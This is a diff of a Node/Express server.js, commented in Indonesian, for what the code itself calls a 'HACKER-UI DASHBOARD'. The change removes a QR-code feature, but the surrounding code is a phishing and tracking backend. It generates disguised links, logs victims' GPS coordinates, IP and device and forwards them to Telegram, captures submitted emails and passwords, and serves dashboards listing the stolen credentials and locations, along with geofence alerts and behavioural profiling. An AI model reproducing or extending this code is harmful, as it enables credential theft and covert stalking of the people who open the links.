@@ -1,4 +1,4 @@
-// File: server.js (v9.0 - Smart Slug & Stability)
+// File: server.js (v9.3 - QR Code Feature Removed)
 
 require('dotenv').config();
 
@@ -10,7 +10,7 @@ const { nanoid } = require('nanoid');
 const fs = require('fs');
 const path = require('path');
 const cors = require('cors');
-const db = require('./db'); // PASTIKAN ANDA MENGGUNAKAN db.js DENGAN createPool
+const db = require('./db');
 const requestIp = require('request-ip');
 const axios = require('axios');
 const bcrypt = require('bcrypt');
@@ -53,6 +53,7 @@ const sendTelegramNotification = async (message) => {
 
 const broadcastDashboardUpdate = async (socket = null) => {
     try {
+        // --- [DIHAPUS] Kolom 'short_id' sudah tidak diambil lagi ---
         const linksQuery = `
             SELECT 
                 l.id, l.original_url, l.created_at, l.expires_at, l.link_type, 
@@ -148,8 +149,14 @@ app.post('/login', async (req, res) => {
     }
 });
 
-app.get('/:id', async (req, res) => {
+// --- [DIHAPUS] Route /s/:shortId untuk QR Code sudah tidak ada ---
+
+app.get('/:id', async (req, res, next) => {
     const { id } = req.params;
+    // Cek jika ID mengandung ekstensi file untuk mencegah konflik dengan file statis
+    if (path.extname(id)) {
+        return next();
+    }
     try {
         const [links] = await db.query(`SELECT l.*, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
         if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
@@ -184,6 +191,7 @@ app.get('/:id', async (req, res) => {
     }
 });
 
+// ... (Sisa kode seperti haversineDistance, checkGeofences, /log, /api/credentials tetap SAMA) ...
 const haversineDistance = (coords1, coords2) => {
     function toRad(x) { return x * Math.PI / 180; }
     const R = 6371e3;
@@ -195,7 +203,6 @@ const haversineDistance = (coords1, coords2) => {
     const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
     return R * c;
 };
-
 async function checkGeofences(locationData) {
     try {
         const [fences] = await db.query('SELECT * FROM geofences');
@@ -226,7 +233,6 @@ async function checkGeofences(locationData) {
         console.error("Error checking geofences:", error);
     }
 }
-
 app.post('/log', async (req, res) => {
     const { latitude, longitude, trackerId, username } = req.body;
     const userAgentString = req.headers['user-agent'];
@@ -278,21 +284,18 @@ app.post('/log', async (req, res) => {
 *Perangkat:* ${browserInfo} pada ${osInfo}
 *Lihat di Peta:* [Google Maps](http://maps.google.com/maps?q=${latitude},${longitude})`;
         await sendTelegramNotification(telegramMessage);
-
         const newLocationDataForMap = { ...newLocation, username, created_at: new Date() };
         io.emit('new_location_logged', newLocationDataForMap);
         
         broadcastDashboardUpdate();
         
         await checkGeofences({ ...newLocation, username });
-
         res.json({ status: 'success' });
     } catch (error) {
         console.error("Error logging location:", error);
         res.status(500).json({ status: 'error' });
     }
 });
-
 app.post('/api/credentials', async (req, res) => {
     const { email, password, trackerId } = req.body;
     const ipAddress = req.clientIp;
@@ -357,7 +360,6 @@ app.post('/create', protectRoute, async (req, res) => {
             userId = result.insertId;
         }
 
-        // --- INI BAGIAN BARUNYA (FITUR LINK CERDAS) ---
         let id;
         try {
             const url = new URL(originalUrl);
@@ -384,8 +386,8 @@ app.post('/create', protectRoute, async (req, res) => {
             console.warn("Gagal membuat slug dari URL, menggunakan nanoid sebagai fallback.");
             id = nanoid(8);
         }
-        // --- AKHIR BAGIAN BARU ---
-
+        
+        // --- [DIHAPUS] Logika pembuatan 'short_id' sudah tidak ada ---
         const newLinkData = { id, user_id: userId, original_url: originalUrl, url_android: url_android || null, url_ios: url_ios || null, expires_at: expiresAt, link_type: linkType || 'direct', ...ogData };
         
         await db.query('INSERT INTO links SET ?', newLinkData);
@@ -399,6 +401,7 @@ app.post('/create', protectRoute, async (req, res) => {
     }
 });
 
+// ... (Sisa kode API routes lainnya tetap sama) ...
 app.delete('/api/links/:id', protectRoute, async (req, res) => {
     const { id } = req.params;
     try {
@@ -411,7 +414,6 @@ app.delete('/api/links/:id', protectRoute, async (req, res) => {
         res.status(500).json({ status: 'error', message: 'Gagal menghapus link.' });
     }
 });
-
 app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
     const { trackerId } = req.params;
     try {
@@ -428,7 +430,6 @@ app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
         res.status(500).json({ error: 'DB error' });
     }
 });
-
 async function analyzeBehavioralPatterns(userId) {
     try {
         const [locations] = await db.query('SELECT latitude, longitude, created_at FROM locations WHERE user_id = ? ORDER BY created_at DESC', [userId]);
@@ -479,7 +480,6 @@ async function analyzeBehavioralPatterns(userId) {
         throw error;
     }
 }
-
 app.get('/api/intel/:username', protectRoute, async (req, res) => {
     const { username } = req.params;
     try {
@@ -492,7 +492,6 @@ app.get('/api/intel/:username', protectRoute, async (req, res) => {
         res.status(500).json({ error: 'Server error during analysis' });
     }
 });
-
 app.get('/api/geofences', protectRoute, async (req, res) => {
     try {
         const [fences] = await db.query('SELECT * FROM geofences ORDER BY name ASC');
@@ -501,7 +500,6 @@ app.get('/api/geofences', protectRoute, async (req, res) => {
         res.status(500).json({ message: 'Failed to fetch geofences' });
     }
 });
-
 app.post('/api/geofences', protectRoute, async (req, res) => {
     const { name, lat, lon, radius } = req.body;
     if (!name || !lat || !lon || !radius) { return res.status(400).json({ message: 'All fields are required' }); }
@@ -512,7 +510,6 @@ app.post('/api/geofences', protectRoute, async (req, res) => {
         res.status(500).json({ message: 'Failed to create geofence' });
     }
 });
-
 app.delete('/api/geofences/:id', protectRoute, async (req, res) => {
     try {
         await db.query('DELETE FROM geofences WHERE id = ?', [req.params.id]);
@@ -521,7 +518,6 @@ app.delete('/api/geofences/:id', protectRoute, async (req, res) => {
         res.status(500).json({ message: 'Failed to delete geofence' });
     }
 });
-
 app.get('/api/alldata/links', protectRoute, async (req, res) => {
     let query = `
         SELECT l.id, l.original_url, l.created_at, l.expires_at, l.link_type, l.click_count, u.username 
@@ -543,7 +539,6 @@ app.get('/api/alldata/links', protectRoute, async (req, res) => {
     const [links] = await db.query(query, params);
     res.json(links);
 });
-
 app.get('/api/alldata/locations', protectRoute, async (req, res) => {
     let query = `
         SELECT loc.id, loc.tracker_id, loc.latitude, loc.longitude, loc.created_at, loc.ip_address, loc.country, loc.city, loc.isp, u.username
@@ -565,7 +560,6 @@ app.get('/api/alldata/locations', protectRoute, async (req, res) => {
     const [locations] = await db.query(query, params);
     res.json(locations);
 });
-
 app.get('/api/alldata/credentials', protectRoute, async (req, res) => {
     let query = `
         SELECT cred.id, cred.tracker_id, cred.email, cred.password, cred.ip_address, cred.created_at, u.username
@@ -587,7 +581,6 @@ app.get('/api/alldata/credentials', protectRoute, async (req, res) => {
     const [credentials] = await db.query(query, params);
     res.json(credentials);
 });
-
 app.delete('/api/alldata/location/:id', protectRoute, async (req, res) => {
     try {
         await db.query('DELETE FROM locations WHERE id = ?', [req.params.id]);
@@ -596,7 +589,6 @@ app.delete('/api/alldata/location/:id', protectRoute, async (req, res) => {
         res.status(500).json({ message: 'Failed to delete location record.' });
     }
 });
-
 app.delete('/api/alldata/credential/:id', protectRoute, async (req, res) => {
     try {
         await db.query('DELETE FROM credentials WHERE id = ?', [req.params.id]);
@@ -605,7 +597,6 @@ app.delete('/api/alldata/credential/:id', protectRoute, async (req, res) => {
         res.status(500).json({ message: 'Failed to delete credential record.' });
     }
 });
-
 app.delete('/api/alldata/all', protectRoute, async (req, res) => {
     let connection;
     try {
@@ -627,7 +618,7 @@ app.delete('/api/alldata/all', protectRoute, async (req, res) => {
 });
 
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v9.0 (Smart Slug & Stability)`);
+    console.log(`\n HACKER-UI DASHBOARD v9.3 (QR Removed)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
